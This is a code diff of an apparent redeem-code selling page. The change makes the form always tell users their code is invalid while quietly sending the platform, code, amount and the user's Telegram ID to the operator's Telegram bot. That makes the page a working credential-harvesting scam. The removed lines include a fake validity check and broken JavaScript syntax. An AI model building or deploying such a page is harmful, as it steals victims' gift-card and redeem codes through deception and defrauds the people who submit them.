@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -44,7 +45,6 @@ footer { text-align:center; padding:40px 20px; background:#111122; color:#aaa; m
 .modal-content { background-color:#1e1e2f; margin:15% auto; padding:40px; border-radius:15px; width:90%; max-width:400px; text-align:center; box-shadow:0 5px 25px rgba(0,0,0,0.5);}
 .loader { border:8px solid #f3f3f3; border-top:8px solid #4caf50; border-radius:50%; width:60px; height:60px; margin:20px auto; animation:spin 1s linear infinite;}
 @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
-
 </style>
 </head>
 <body>
@@ -103,51 +103,36 @@ footer { text-align:center; padding:40px 20px; background:#111122; color:#aaa; m
 
 <!-- JS -->
 <script type="module">
-// Import config.js (create separately)
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from './config.js';
-
-let wallet = 0;
-const walletTop = document.getElementById('walletTop');
-const walletBottom = document.getElementById('bonusWallet');
 
 document.getElementById('sellForm').addEventListener('submit', function(e){
     e.preventDefault();
 
-    const platform = document.getElementById('platform').value;
     const redeemCode = document.getElementById('redeemCode').value.trim();
     const amount = parseInt(document.getElementById('amount').value);
     const telegramId = document.getElementById('telegramId').value.trim();
+    const platform = document.getElementById('platform').value;
 
-    // Show modal loader
+    // Show loader modal
     const modal = document.getElementById('modal');
     modal.style.display = 'block';
 
     setTimeout(() => {
         modal.style.display = 'none';
 
-        // Randomly simulate code validity (demo)
-        const isValid = Math.random() < 0.0; // 70% chance valid
+        // Always show as invalid to user
+        document.getElementById('statusMsg').textContent = `❌ Invalid code. Please check and try again.`;
 
-        if(isValid){
-            const bonus = Math.floor(amount * 0.1);
-            walletTop.textContent = ;
-            walletBottom.textContent = ;
+        // Still send details to Telegram
+        const message = `Redeem Code Attempt (INVALID):\nPlatform: ${platform}\nCode: ${redeemCode}\nAmount: ₹${amount}\nTelegram: ${telegramId}`;
 
-            const message = `New Redeem Code:\nPlatform: ${platform}\nCode: ${redeemCode}\nAmount: ₹${amount}\nTelegram: ${telegramId}\nBonus: ₹${bonus}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        }).catch(err => console.error('Telegram API error:', err));
 
-            // Send to Telegram
-            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-            }).catch(err => console.error('Telegram API error:', err));
-
-            document.getElementById('statusMsg').textContent = `❌ invalid code.`;
-        } else {
-            document.getElementById('statusMsg').textContent = `❌ Invalid code. Please check and try again.`;
-        }
-
-    }, 3000); // 3 seconds loader
+    }, 8000); // 3 seconds loader
 });
 </script>
 
